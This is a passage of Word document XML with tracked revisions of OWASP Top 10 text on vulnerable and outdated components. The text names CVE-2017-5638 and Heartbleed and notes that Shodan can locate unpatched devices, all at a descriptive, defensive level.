          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>e.g</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:del w:id="2385" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2386" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>., a</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> backdoor in </w:t>
      </w:r>
      <w:ins w:id="2387" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">a </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">component). Some </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>example</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> exploitable component</w:t>
      </w:r>
      <w:del w:id="2388" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5ED40237" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>vulnerabilities discovered are:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0665DD36" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0CE4234F" w14:textId="167E65EE" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2389" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2390" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2391" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CVE-2017-5638</w:t>
      </w:r>
      <w:del w:id="2392" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638),</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2393" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> a Struts 2 remote code execution vulnerability that</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="272B3424" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2394" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2395" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> enables </w:t>
      </w:r>
      <w:ins w:id="2396" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">the </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>execution of arbitrary code on the server, has been</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F7C0386" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2397" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> blamed for significant breaches.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="139FF93C" w14:textId="0A19263E" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2398" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2399" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7B292632" w14:textId="10231B50" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2400" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2401" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> While </w:t>
      </w:r>
      <w:del w:id="2402" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>[</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2403" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">the </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>internet of things (IoT</w:t>
      </w:r>
      <w:del w:id="2404" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>)](https://en.wikipedia.org/wiki/Internet_of_things) are</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2405" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>) is</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> frequently difficult or</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74AB3D3A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2406" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2407" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> impossible to patch, the importance of patching them can be great</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6858DE04" w14:textId="2DDB755A" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2408" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">   </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>e.g</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:del w:id="2409" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2410" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>.,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> biomedical devices).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="344A3AB6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1EBB2A3E" w14:textId="5731CB65" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2411" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>There are automated tools to help attackers find unpatched or</w:t>
      </w:r>
      <w:del w:id="2412" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0D504300" w14:textId="7629B86D" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2413" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">misconfigured systems. For example, the </w:t>
      </w:r>
      <w:del w:id="2414" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>[</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Shodan IoT search engine</w:t>
      </w:r>
      <w:del w:id="2415" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>](https://www.shodan.io/report/89bnfUyJ)</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> can</w:t>
      </w:r>
      <w:del w:id="2416" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="5B270C7F" w14:textId="71DEAB78" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2417" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">help you find devices that still suffer from </w:t>
      </w:r>
      <w:del w:id="2418" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>[</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Heartbleed</w:t>
      </w:r>
      <w:del w:id="2419" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>](https://en.wikipedia.org/wiki/Heartbleed)</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> vulnerability</w:t>
      </w:r>
      <w:del w:id="2420" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> that was </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="04175881" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>patched in April 2014.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EAB03B7" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06651EFF" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2421" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2422" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>## References</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7062CE9C" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2423" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="199D3CCC" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2424" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2425" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>### OWASP</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="403216FB" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2426" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51BA3575" w14:textId="5CA86FDA" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2427" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2428" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2429" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">## References </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">{{ </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>osib</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>_anchor</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>(</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>osib</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
